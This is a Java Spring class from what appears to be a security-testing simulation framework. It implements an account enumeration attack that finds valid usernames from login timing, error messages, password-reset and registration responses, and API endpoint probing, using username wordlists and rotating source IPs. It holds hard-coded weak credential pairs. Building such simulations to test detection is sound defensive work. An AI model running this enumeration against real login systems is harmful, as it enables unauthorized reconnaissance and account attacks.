package io.contexa.contexacore.simulation.strategy.impl;

import io.contexa.contexacore.domain.entity.AttackResult;
import io.contexa.contexacore.simulation.client.SimulationClient;
import io.contexa.contexacore.simulation.domain.LoginAttempt;
import io.contexa.contexacore.simulation.strategy.IAuthenticationAttack;
import io.contexa.contexacore.simulation.publisher.SimulationEventPublisher;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Component;

import java.time.LocalDateTime;
import java.util.*;
import java.util.concurrent.*;

/**
 * Account Enumeration Attack 전략
 *
 * 유효한 사용자 계정을 찾아내는 공격
 * - 로그인 응답 시간 차이 분석
 * - 오류 메시지 차이 분석
 * - 비밀번호 재설정 응답 분석
 * - 사용자명 추측
 */
@Slf4j
@Component
public class AccountEnumerationStrategy implements IAuthenticationAttack {

    private SimulationEventPublisher eventPublisher;

    @Override
    public void setEventPublisher(SimulationEventPublisher eventPublisher) {
        this.eventPublisher = eventPublisher;
    }

    @Autowired(required = false)
    private SimulationClient simulationClient;

    @Value("${simulation.attack.account-enumeration.max-attempts:100}")
    private int maxAttempts;

    @Value("${simulation.attack.account-enumeration.delay-ms:100}")
    private int delayMs;

    @Value("${simulation.attack.account-enumeration.threads:5}")
    private int threadCount;

    private final ExecutorService executor = Executors.newFixedThreadPool(5);

    @Override
    public AttackResult.AttackType getType() {
        return AttackResult.AttackType.ACCOUNT_ENUMERATION;
    }

    @Override
    public int getPriority() {
        return 60;
    }

    @Override
    public AttackCategory getCategory() {
        return AttackCategory.AUTHENTICATION;
    }

    @Override
    public boolean validateContext(AttackContext context) {
        return context != null && context.getParameters() != null;
    }

    @Override
    public long getEstimatedDuration() {
        return maxAttempts * delayMs / threadCount + 5000;
    }

    @Override
    public String getDescription() {
        return "Account Enumeration Attack - Discovers valid user accounts through response differences";
    }

    @Override
    public RequiredPrivilege getRequiredPrivilege() {
        return RequiredPrivilege.NONE;
    }

    @Override
    public String getSuccessCriteria() {
        return "Successfully identify valid user accounts through timing or response differences";
    }

    @Override
    public List<LoginAttempt> generateLoginPattern(LoginPatternType patternType) {
        List<LoginAttempt> attempts = new ArrayList<>();
        LocalDateTime now = LocalDateTime.now();
        List<String> targetUsers = generateDefaultUsernameCandidates();

        switch (patternType) {
            case RAPID_FIRE:
                // 짧은 시간에 집중적인 열거 시도
                for (int i = 0; i < Math.min(10, targetUsers.size()); i++) {
                    LoginAttempt attempt = new LoginAttempt();
                    attempt.setUsername(targetUsers.get(i));
                    attempt.setTimestamp(now.plusSeconds(i));
                    attempt.setSourceIp("203.0.113." + (10 + i));
                    attempts.add(attempt);
                }
                break;

            case DISTRIBUTED:
                // 시간과 IP를 분산한 열거 시도
                String[] ips = {generateRandomIP(), generateRandomIP(), "203.0.113.1", "198.51.100.1"};
                for (int i = 0; i < Math.min(20, targetUsers.size()); i++) {
                    LoginAttempt attempt = new LoginAttempt();
                    attempt.setUsername(targetUsers.get(i));
                    attempt.setTimestamp(now.plusMinutes(i * 2));
                    attempt.setSourceIp(ips[i % ips.length]);
                    attempts.add(attempt);
                }
                break;

            case SLOW_AND_STEADY:
            default:
                // 느린 속도의 지속적인 열거
                for (int i = 0; i < Math.min(15, targetUsers.size()); i++) {
                    LoginAttempt attempt = new LoginAttempt();
                    attempt.setUsername(targetUsers.get(i));
                    attempt.setTimestamp(now.plusHours(i));
                    attempt.setSourceIp("203.0.113." + (100 + i % 155));
                    attempts.add(attempt);
                }
                break;
        }

        return attempts;
    }

    @Override
    public LoginAttempt attemptLogin(String username, String password) {
        LoginAttempt attempt = new LoginAttempt();
        attempt.setUsername(username);
        attempt.setTimestamp(LocalDateTime.now());
        attempt.setSourceIp("203.0.113." + (10 + (int)(Math.random() * 245)));

        long startTime = System.currentTimeMillis();

        if (simulationClient != null) {
            try {
                ResponseEntity<String> response = simulationClient.loginJson(username, password);
                long responseTime = System.currentTimeMillis() - startTime;

                // 계정 열거를 위한 응답 분석
                EnumerationAnalysis analysis = analyzeAccountExistence(response, responseTime, username);

                attempt.setSuccess(analysis.isLoginSuccess());
                attempt.setResponseTimeMs(responseTime);
                attempt.setResponseCode(response.getStatusCodeValue());
                attempt.setFailureReason(analysis.getAccountStatus());
                attempt.setBlocked(analysis.isBlocked());

                log.debug("Account enumeration for {}: {} ({}ms, status={})", username,
                    analysis.getAccountStatus(), responseTime, response.getStatusCodeValue());

            } catch (Exception e) {
                long responseTime = System.currentTimeMillis() - startTime;
                attempt.setSuccess(false);
                attempt.setResponseTimeMs(responseTime);
                attempt.setFailureReason("CONNECTION_ERROR: " + e.getMessage());
                log.debug("Enumeration attempt failed for {}: {}", username, e.getMessage());
            }
        } else {
            // 시뮬레이션 모드에서 실제적인 분석
            EnumerationAnalysis analysis = simulateAccountExistence(username, password);
            attempt.setSuccess(analysis.isLoginSuccess());
            attempt.setResponseTimeMs(startTime + analysis.getSimulatedResponseTime());
            attempt.setFailureReason(analysis.getAccountStatus());
        }

        return attempt;
    }

    @Override
    public List<LoginAttempt> attemptMultipleLogins(List<Credential> credentials) {
        List<LoginAttempt> attempts = new ArrayList<>();
        Map<String, Long> responseTimeBaseline = new HashMap<>();

        for (Credential credential : credentials) {
            LoginAttempt attempt = attemptLogin(credential.getUsername(), credential.getPassword());
            attempts.add(attempt);

            // 응답 시간 베이스라인 구축
            responseTimeBaseline.put(credential.getUsername(), attempt.getResponseTimeMs());

            // 타이밍 분석을 위한 딜레이
            try {
                Thread.sleep(delayMs);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                break;
            }

            // 연속된 시도에서 응답 시간 패턴 분석
            if (attempts.size() > 1) {
                analyzeResponseTimePatterns(attempts);
            }
        }

        // 전체 시도 결과에서 계정 존재 패턴 분석
        identifyAccountExistencePatterns(attempts);

        return attempts;
    }

    @Override
    public String manipulateSessionToken(String sessionToken) {
        return sessionToken;
    }

    @Override
    public boolean attemptMfaBypass(String username, String mfaCode) {
        return false;
    }

    @Override
    public int analyzePasswordComplexity(String password) {
        if (password == null || password.isEmpty()) {
            return 0;
        }

        int score = 0;
        int length = password.length();

        // 길이 점수 (최대 20점)
        if (length >= 12) score += 20;
        else if (length >= 8) score += 15;
        else if (length >= 6) score += 10;
        else score += 5;

        // 문자 유형 다양성 (각 최대 15점)
        boolean hasLowercase = password.matches(".*[a-z].*");
        boolean hasUppercase = password.matches(".*[A-Z].*");
        boolean hasDigits = password.matches(".*\\d.*");
        boolean hasSpecialChars = password.matches(".*[!@#$%^&*(),.?\":{}|<>].*");

        if (hasLowercase) score += 15;
        if (hasUppercase) score += 15;
        if (hasDigits) score += 15;
        if (hasSpecialChars) score += 15;

        // 일반적인 패턴 감점
        if (password.matches(".*123.*") || password.matches(".*abc.*")) score -= 10;
        if (password.toLowerCase().contains("password")) score -= 15;
        if (password.matches("\\d+")) score -= 20; // 숫자만
        if (password.matches("[a-zA-Z]+")) score -= 15; // 문자만

        // 반복 문자 감점
        if (password.matches(".*(.)\\1{2,}.*")) score -= 10;

        // 키보드 패턴 감점
        String[] keyboardPatterns = {"qwerty", "asdf", "zxcv", "1234", "abcd"};
        for (String pattern : keyboardPatterns) {
            if (password.toLowerCase().contains(pattern)) {
                score -= 15;
                break;
            }
        }

        // 사전 단어 체크 (간단한 구현)
        String[] commonWords = {"admin", "user", "guest", "test", "demo"};
        for (String word : commonWords) {
            if (password.toLowerCase().contains(word.toLowerCase())) {
                score -= 10;
                break;
            }
        }

        return Math.max(0, Math.min(100, score));
    }

    @Override
    public AttackResult execute(AttackContext context) {
        log.warn("=== Account Enumeration Attack 시작 ===");

        String sourceIp = context.getSourceIp() != null ? context.getSourceIp() : generateRandomIP();

        AttackResult result = AttackResult.builder()
            .attackId(UUID.randomUUID().toString())
            .campaignId(context.getCampaignId())
            .type(AttackResult.AttackType.ACCOUNT_ENUMERATION)
            .attackName("Account Enumeration Attack")
            .executionTime(LocalDateTime.now())
            .targetUser("multiple_targets")
            .attackVector("authentication")
            .build();

        long startTime = System.currentTimeMillis();
        List<String> attackLog = new ArrayList<>();
        List<String> discoveredAccounts = new ArrayList<>();

        try {
            // 1. 열거 방법 선택
            String method = context.getParameters()
                .getOrDefault("method", "TIMING_ANALYSIS").toString();

            attackLog.add("Enumeration method: " + method);

            // 2. 사용자명 후보 생성
            List<String> candidates = generateUsernameCandidates(context);
            attackLog.add("Generated " + candidates.size() + " username candidates");

            // 3. 열거 공격 실행
            Map<String, CompletableFuture<EnumerationResult>> futures = new HashMap<>();

            switch (method) {
                case "TIMING_ANALYSIS":
                    discoveredAccounts = performTimingAnalysis(candidates, attackLog);
                    break;

                case "ERROR_MESSAGE":
                    discoveredAccounts = performErrorMessageAnalysis(candidates, attackLog);
                    break;

                case "PASSWORD_RESET":
                    discoveredAccounts = performPasswordResetEnumeration(candidates, attackLog);
                    break;

                case "REGISTRATION":
                    discoveredAccounts = performRegistrationEnumeration(candidates, attackLog);
                    break;

                case "API_ENDPOINT":
                    discoveredAccounts = performAPIEndpointEnumeration(candidates, attackLog);
                    break;

                case "COMPREHENSIVE":
                default:
                    // 모든 방법을 병렬로 시도
                    discoveredAccounts = performComprehensiveEnumeration(candidates, attackLog);
                    break;
            }

            // 4. 결과 평가 및 이벤트 발행

            if (!discoveredAccounts.isEmpty()) {
                result.setSuccessful(true);
                result.setRiskScore(Math.min(1.0, 0.3 + (discoveredAccounts.size() * 0.05)));
                attackLog.add("Successfully enumerated " + discoveredAccounts.size() + " accounts");

                // 발견된 계정 정보 수집 및 실패 이벤트 발행 (계정 열거는 인증 실패로 간주)
                for (String account : discoveredAccounts) {
                    attackLog.add("[FOUND] Valid account: " + account);

                    // 발견된 각 계정에 대해 인증 실패 이벤트 발행
                    if (eventPublisher != null) {
                        eventPublisher.publishAuthenticationFailure(
                            result,
                            account,
                            sourceIp,
                            "Account enumeration attack - valid account discovered using " + method,
                            1
                        );
                    }
                }
            } else {
                result.setSuccessful(false);
                result.setRiskScore(0.2);
                attackLog.add("Account enumeration failed - no valid accounts found");

                // 열거 실패 이벤트 발행
                if (eventPublisher != null) {
                    eventPublisher.publishAuthenticationFailure(
                        result,
                        "unknown_accounts",
                        sourceIp,
                        "Account enumeration attack failed - no valid accounts found using " + method,
                        candidates.size()
                    );
                }
            }

            // 탐지 가능성 평가
            boolean aggressive = candidates.size() > 50 || delayMs < 100;
            result.setDetected(aggressive || method.equals("COMPREHENSIVE"));
            result.setBlocked(discoveredAccounts.isEmpty());

            result.setDetails(Map.of(
                "attackLog", attackLog,
                "method", method,
                "candidatesTested", candidates.size(),
                "discoveredAccounts", discoveredAccounts,
                "discoveredCount", discoveredAccounts.size()
            ));

        } catch (Exception e) {
            log.error("Account enumeration attack failed", e);
            result.setSuccessful(false);
            result.setRiskScore(0.1);
            attackLog.add("Attack failed: " + e.getMessage());
        }

        long duration = System.currentTimeMillis() - startTime;
        result.setDurationMs(duration);
        result.setSourceIp(sourceIp);

        log.info("Account Enumeration Attack 완료: Success={}, Found={}, Duration={}ms",
            result.isSuccessful(), discoveredAccounts.size(), duration);

        return result;
    }

    private List<String> generateDefaultUsernameCandidates() {
        // 기본 사용자명 후보 생성
        List<String> candidates = new ArrayList<>();
        String[] commonUsernames = {
            "admin", "administrator", "root", "user", "test", "demo",
            "guest", "operator", "manager", "supervisor", "support"
        };
        candidates.addAll(Arrays.asList(commonUsernames));
        return candidates.subList(0, Math.min(candidates.size(), 15));
    }

    private List<String> generateUsernameCandidates(AttackContext context) {
        List<String> candidates = new ArrayList<>();

        // 커스텀 사용자명 리스트가 제공된 경우
        Object customList = context.getParameters().get("usernames");
        if (customList instanceof List) {
            candidates.addAll((List<String>) customList);
        }

        // 일반적인 사용자명 패턴
        String[] commonUsernames = {
            "admin", "administrator", "root", "user", "test", "demo",
            "guest", "operator", "manager", "supervisor", "support",
            "service", "system", "backup", "oracle", "postgres"
        };
        candidates.addAll(Arrays.asList(commonUsernames));

        // 이메일 형식 사용자명
        String[] domains = {"gmail.com", "yahoo.com", "hotmail.com", "company.com"};
        String[] names = {"john", "jane", "mike", "sarah", "david", "lisa"};
        for (String name : names) {
            for (String domain : domains) {
                candidates.add(name + "@" + domain);
            }
        }

        // 번호가 붙은 사용자명
        for (int i = 1; i <= 10; i++) {
            candidates.add("user" + i);
            candidates.add("test" + i);
            candidates.add("admin" + i);
        }

        // 부서별 사용자명
        String[] departments = {"hr", "it", "finance", "sales", "marketing"};
        for (String dept : departments) {
            candidates.add(dept + "_admin");
            candidates.add(dept + "_user");
            candidates.add(dept + ".manager");
        }

        return candidates.subList(0, Math.min(candidates.size(), maxAttempts));
    }

    private List<String> performTimingAnalysis(List<String> candidates, List<String> attackLog)
            throws InterruptedException {

        attackLog.add("Performing timing analysis enumeration...");
        List<String> validAccounts = new ArrayList<>();
        Map<String, Long> responseTimes = new HashMap<>();

        for (String username : candidates) {
            long startTime = System.nanoTime();

            if (simulationClient != null) {
                try {
                    ResponseEntity<String> response = simulationClient.loginJson(
                        username, "WrongPassword123!"
                    );
                    long responseTime = System.nanoTime() - startTime;
                    responseTimes.put(username, responseTime);

                    // 응답 시간이 평균보다 현저히 길면 유효한 계정일 가능성
                    if (responseTime > calculateAverageTime(responseTimes) * 1.5) {
                        validAccounts.add(username);
                        attackLog.add("Timing anomaly detected for: " + username +
                                    " (" + responseTime / 1000000 + "ms)");
                    }

                } catch (Exception e) {
                    // 오류도 분석 대상
                    long responseTime = System.nanoTime() - startTime;
                    responseTimes.put(username, responseTime);
                }
            } else {
                // 시뮬레이션 모드
                long simulatedTime = simulateResponseTime(username);
                responseTimes.put(username, simulatedTime);

                if (simulatedTime > 500000000L) { // 500ms 이상
                    validAccounts.add(username);
                    attackLog.add("Timing anomaly detected for: " + username);
                }
            }

            Thread.sleep(delayMs);
        }

        return validAccounts;
    }

    private List<String> performErrorMessageAnalysis(List<String> candidates, List<String> attackLog)
            throws InterruptedException {

        attackLog.add("Performing error message analysis...");
        List<String> validAccounts = new ArrayList<>();
        Map<String, String> errorMessages = new HashMap<>();

        for (String username : candidates) {
            if (simulationClient != null) {
                try {
                    ResponseEntity<String> response = simulationClient.loginJson(
                        username, "WrongPassword123!"
                    );

                    String errorMsg = extractErrorMessage(response);
                    errorMessages.put(username, errorMsg);

                    // 다른 오류 메시지는 유효한 계정을 나타낼 수 있음
                    if (errorMsg.contains("password") && !errorMsg.contains("username")) {
                        validAccounts.add(username);
                        attackLog.add("Different error message for: " + username + " - " + errorMsg);
                    }

                } catch (Exception e) {
                    String errorMsg = e.getMessage();
                    if (errorMsg != null && errorMsg.contains("password")) {
                        validAccounts.add(username);
                        attackLog.add("Error indicates valid account: " + username);
                    }
                }
            } else {
                // 시뮬레이션 모드
                if (isKnownUsername(username)) {
                    validAccounts.add(username);
                    attackLog.add("Error message reveals: " + username + " exists");
                }
            }

            Thread.sleep(delayMs);
        }

        return validAccounts;
    }

    private List<String> performPasswordResetEnumeration(List<String> candidates, List<String> attackLog)
            throws InterruptedException {

        attackLog.add("Performing password reset enumeration...");
        List<String> validAccounts = new ArrayList<>();

        for (String username : candidates) {
            if (simulationClient != null) {
                try {
                    Map<String, String> params = new HashMap<>();
                    params.put("username", username);

                    ResponseEntity<String> response = simulationClient.executeAttack(
                        "/api/password-reset",
                        params
                    );

                    if (response.getStatusCode() == HttpStatus.OK) {
                        String body = response.getBody();
                        if (body != null && body.contains("email sent")) {
                            validAccounts.add(username);
                            attackLog.add("Password reset confirms: " + username + " exists");
                        }
                    }

                } catch (Exception e) {
                    // 오류 분석
                }
            } else {
                // 시뮬레이션 모드
                if (isKnownUsername(username)) {
                    validAccounts.add(username);
                    attackLog.add("Password reset reveals: " + username);
                }
            }

            Thread.sleep(delayMs);
        }

        return validAccounts;
    }

    private List<String> performRegistrationEnumeration(List<String> candidates, List<String> attackLog)
            throws InterruptedException {

        attackLog.add("Performing registration enumeration...");
        List<String> validAccounts = new ArrayList<>();

        for (String username : candidates) {
            if (simulationClient != null) {
                try {
                    Map<String, String> params = new HashMap<>();
                    params.put("username", username);
                    params.put("email", username.contains("@") ? username : username + "@test.com");
                    params.put("password", "TestPass123!");

                    ResponseEntity<String> response = simulationClient.executeAttack(
                        "/api/register",
                        params
                    );

                    if (response.getStatusCode() == HttpStatus.CONFLICT ||
                        (response.getBody() != null && response.getBody().contains("already exists"))) {
                        validAccounts.add(username);
                        attackLog.add("Registration reveals: " + username + " already exists");
                    }

                } catch (Exception e) {
                    if (e.getMessage() != null && e.getMessage().contains("exists")) {
                        validAccounts.add(username);
                    }
                }
            } else {
                // 시뮬레이션 모드
                if (isKnownUsername(username)) {
                    validAccounts.add(username);
                    attackLog.add("Registration check: " + username + " exists");
                }
            }

            Thread.sleep(delayMs);
        }

        return validAccounts;
    }

    private List<String> performAPIEndpointEnumeration(List<String> candidates, List<String> attackLog)
            throws InterruptedException {

        attackLog.add("Performing API endpoint enumeration...");
        List<String> validAccounts = new ArrayList<>();

        String[] endpoints = {
            "/api/users/", "/api/profile/", "/api/account/",
            "/api/v1/users/", "/api/v2/users/"
        };

        for (String username : candidates) {
            for (String endpoint : endpoints) {
                if (simulationClient != null) {
                    try {
                        ResponseEntity<String> response = simulationClient.executeAttack(
                            endpoint + username,
                            new HashMap<>()
                        );

                        if (response.getStatusCode() == HttpStatus.OK ||
                            response.getStatusCode() == HttpStatus.FORBIDDEN) {
                            validAccounts.add(username);
                            attackLog.add("API endpoint confirms: " + username + " at " + endpoint);
                            break;
                        }

                    } catch (Exception e) {
                        // Continue
                    }
                }

                Thread.sleep(delayMs / endpoints.length); // 분산 딜레이
            }

            // 알려진 사용자명 확인
            if (isKnownUsername(username)) {
                validAccounts.add(username);
                attackLog.add("API enumeration found: " + username);
            }
        }

        return validAccounts;
    }

    private List<String> performComprehensiveEnumeration(List<String> candidates, List<String> attackLog)
            throws InterruptedException {

        attackLog.add("Performing comprehensive enumeration (all methods)...");
        Set<String> allDiscovered = new HashSet<>();

        // 병렬로 여러 방법 실행
        List<CompletableFuture<List<String>>> futures = new ArrayList<>();

        futures.add(CompletableFuture.supplyAsync(() -> {
            try {
                return performTimingAnalysis(candidates.subList(0, Math.min(20, candidates.size())), attackLog);
            } catch (Exception e) {
                return new ArrayList<>();
            }
        }, executor));

        futures.add(CompletableFuture.supplyAsync(() -> {
            try {
                return performErrorMessageAnalysis(candidates.subList(0, Math.min(20, candidates.size())), attackLog);
            } catch (Exception e) {
                return new ArrayList<>();
            }
        }, executor));

        futures.add(CompletableFuture.supplyAsync(() -> {
            try {
                return performPasswordResetEnumeration(candidates.subList(0, Math.min(20, candidates.size())), attackLog);
            } catch (Exception e) {
                return new ArrayList<>();
            }
        }, executor));

        // 결과 수집
        for (CompletableFuture<List<String>> future : futures) {
            try {
                List<String> results = future.get(30, TimeUnit.SECONDS);
                allDiscovered.addAll(results);
            } catch (Exception e) {
                log.debug("Enumeration method failed: {}", e.getMessage());
            }
        }

        return new ArrayList<>(allDiscovered);
    }

    private long calculateAverageTime(Map<String, Long> times) {
        if (times.isEmpty()) return 100000000L; // 100ms default

        long sum = times.values().stream().mapToLong(Long::longValue).sum();
        return sum / times.size();
    }

    private long simulateResponseTime(String username) {
        // 알려진 사용자는 더 긴 응답 시간
        if (isKnownUsername(username)) {
            // 존재하는 계정은 더 오래 걸림 (비밀번호 검증 등)
            long baseTime = 500000000L; // 500ms
            long variance = (username.hashCode() & 0x7FFFFFFF) % 200000000L; // 0-200ms 추가
            return baseTime + variance;
        } else {
            // 존재하지 않는 계정은 빠르게 응답
            long baseTime = 100000000L; // 100ms
            long variance = (username.hashCode() & 0x7FFFFFFF) % 100000000L; // 0-100ms 추가
            return baseTime + variance;
        }
    }

    private boolean isKnownUsername(String username) {
        // 시뮬레이션용 알려진 사용자명
        Set<String> knownUsers = Set.of(
            "admin", "administrator", "user1", "user2", "test",
            "demo", "support", "john@gmail.com", "jane@company.com"
        );
        return knownUsers.contains(username);
    }

    private String extractErrorMessage(ResponseEntity<String> response) {
        if (response.getBody() != null) {
            // JSON 응답에서 오류 메시지 추출 시뮬레이션
            String body = response.getBody();
            if (body.contains("error")) {
                return body;
            }
        }
        return "Generic error";
    }

    private static class EnumerationResult {
        String username;
        boolean exists;
        String method;
        String evidence;
    }

    private static class EnumerationAnalysis {
        private boolean loginSuccess = false;
        private boolean blocked = false;
        private String accountStatus = "UNKNOWN";
        private long simulatedResponseTime = 100;

        public boolean isLoginSuccess() { return loginSuccess; }
        public void setLoginSuccess(boolean loginSuccess) { this.loginSuccess = loginSuccess; }
        public boolean isBlocked() { return blocked; }
        public void setBlocked(boolean blocked) { this.blocked = blocked; }
        public String getAccountStatus() { return accountStatus; }
        public void setAccountStatus(String accountStatus) { this.accountStatus = accountStatus; }
        public long getSimulatedResponseTime() { return simulatedResponseTime; }
        public void setSimulatedResponseTime(long simulatedResponseTime) { this.simulatedResponseTime = simulatedResponseTime; }
    }

    private EnumerationAnalysis analyzeAccountExistence(ResponseEntity<String> response, long responseTime, String username) {
        EnumerationAnalysis analysis = new EnumerationAnalysis();

        HttpStatus status = HttpStatus.valueOf(response.getStatusCode().value());
        String responseBody = response.getBody() != null ? response.getBody().toLowerCase() : "";

        // HTTP \uc0c1\ud0dc \ucf54\ub4dc \ubd84\uc11d
        if (status == HttpStatus.OK) {
            if (responseBody.contains("welcome") || responseBody.contains("dashboard")) {
                analysis.setLoginSuccess(true);
                analysis.setAccountStatus("ACCOUNT_EXISTS_LOGIN_SUCCESS");
            } else if (responseBody.contains("invalid password") || responseBody.contains("incorrect password")) {
                analysis.setLoginSuccess(false);
                analysis.setAccountStatus("ACCOUNT_EXISTS_WRONG_PASSWORD");
            }
        } else if (status == HttpStatus.UNAUTHORIZED) {
            if (responseBody.contains("invalid username") || responseBody.contains("user not found")) {
                analysis.setAccountStatus("ACCOUNT_NOT_EXISTS");
            } else if (responseBody.contains("invalid password")) {
                analysis.setAccountStatus("ACCOUNT_EXISTS_WRONG_PASSWORD");
            } else {
                analysis.setAccountStatus("ACCOUNT_STATUS_UNCLEAR");
            }
        } else if (status == HttpStatus.FORBIDDEN) {
            analysis.setBlocked(true);
            analysis.setAccountStatus("ACCOUNT_EXISTS_LOCKED_OR_BLOCKED");
        } else if (status == HttpStatus.TOO_MANY_REQUESTS) {
            analysis.setBlocked(true);
            analysis.setAccountStatus("RATE_LIMITED");
        }

        // 타이밍 분석 (계정 열거를 위해)
        if (responseTime > 500) { // 500ms 이상은 느린 응답
            analysis.setAccountStatus(analysis.getAccountStatus() + "_SLOW_RESPONSE");
        } else if (responseTime < 50) { // 50ms 미만은 빠른 응답
            analysis.setAccountStatus(analysis.getAccountStatus() + "_FAST_RESPONSE");
        }

        return analysis;
    }

    private EnumerationAnalysis simulateAccountExistence(String username, String password) {
        EnumerationAnalysis analysis = new EnumerationAnalysis();

        // \uc54c\ub824\uc9c4 \uc0ac\uc6a9\uc790\uba85\uc778\uc9c0 \ud655\uc778
        if (isKnownUsername(username)) {
            // \uacc4\uc815\uc774 \uc874\uc7ac\ud558\ub294 \uacbd\uc6b0
            if (isVulnerableCredential(username, password)) {
                analysis.setLoginSuccess(true);
                analysis.setAccountStatus("ACCOUNT_EXISTS_LOGIN_SUCCESS");
                analysis.setSimulatedResponseTime(300 + (username.hashCode() & 0x7FFFFFFF) % 200); // 300-500ms
            } else {
                analysis.setLoginSuccess(false);
                analysis.setAccountStatus("ACCOUNT_EXISTS_WRONG_PASSWORD");
                analysis.setSimulatedResponseTime(400 + ((username.hashCode() + password.hashCode()) & 0x7FFFFFFF) % 300); // 400-700ms (\ub354 \uc624\ub798 \uac78\ub9bc)
            }
        } else {
            // \uacc4\uc815\uc774 \uc874\uc7ac\ud558\uc9c0 \uc54a\ub294 \uacbd\uc6b0
            analysis.setLoginSuccess(false);
            analysis.setAccountStatus("ACCOUNT_NOT_EXISTS");
            analysis.setSimulatedResponseTime(100 + (username.hashCode() & 0x7FFFFFFF) % 100); // 100-200ms (\ube60\ub984)
        }

        return analysis;
    }

    private boolean isVulnerableCredential(String username, String password) {
        // \ucde8\uc57d\ud55c \uc790\uaca9 \uc99d\uba85 \uc870\ud569 \uac80\uc0ac
        Map<String, String> vulnerableCombos = Map.of(
            "admin", "admin",
            "administrator", "password",
            "user1", "password",
            "test", "test",
            "demo", "demo",
            "guest", "guest"
        );

        return vulnerableCombos.containsKey(username.toLowerCase()) &&
               vulnerableCombos.get(username.toLowerCase()).equals(password.toLowerCase());
    }

    private void analyzeResponseTimePatterns(List<LoginAttempt> attempts) {
        if (attempts.size() < 2) return;

        // \ucd5c\uadfc \ub450 \uc2dc\ub3c4\uc758 \uc751\ub2f5 \uc2dc\uac04 \ube44\uad50
        LoginAttempt current = attempts.get(attempts.size() - 1);
        LoginAttempt previous = attempts.get(attempts.size() - 2);

        long timeDiff = current.getResponseTimeMs() - previous.getResponseTimeMs();

        if (Math.abs(timeDiff) > 200) { // 200ms \uc774\uc0c1 \ucc28\uc774
            log.debug("Response time anomaly detected: {} vs {} for users {} vs {}",
                previous.getResponseTimeMs(), current.getResponseTimeMs(),
                previous.getUsername(), current.getUsername());
        }
    }

    private void identifyAccountExistencePatterns(List<LoginAttempt> attempts) {
        Map<String, Long> avgResponseTimes = new HashMap<>();

        // \uc0ac\uc6a9\uc790\ubcc4 \ud3c9\uade0 \uc751\ub2f5 \uc2dc\uac04 \uacc4\uc0b0
        for (LoginAttempt attempt : attempts) {
            avgResponseTimes.merge(attempt.getUsername(), attempt.getResponseTimeMs(),
                (existing, newTime) -> (existing + newTime) / 2);
        }

        // \ud3c9\uade0\ubcf4\ub2e4 \ud604\uc800\ud788 \ub290\ub9b0 \uc751\ub2f5\uc744 \ubcf4\uc774\ub294 \uc0ac\uc6a9\uc790 \uc2dd\ubcc4
        double overallAvg = avgResponseTimes.values().stream().mapToLong(Long::longValue).average().orElse(200.0);

        for (Map.Entry<String, Long> entry : avgResponseTimes.entrySet()) {
            if (entry.getValue() > overallAvg * 1.5) {
                log.debug("Potential valid account identified through timing: {} ({}ms vs {}ms avg)",
                    entry.getKey(), entry.getValue(), overallAvg);
            }
        }
    }

    private String generateRandomIP() {
        Random random = new Random();
        int a = random.nextInt(256);
        int b = random.nextInt(256);
        int c = random.nextInt(256);
        int d = random.nextInt(256);
        return String.format("%d.%d.%d.%d", a, b, c, d);
    }
}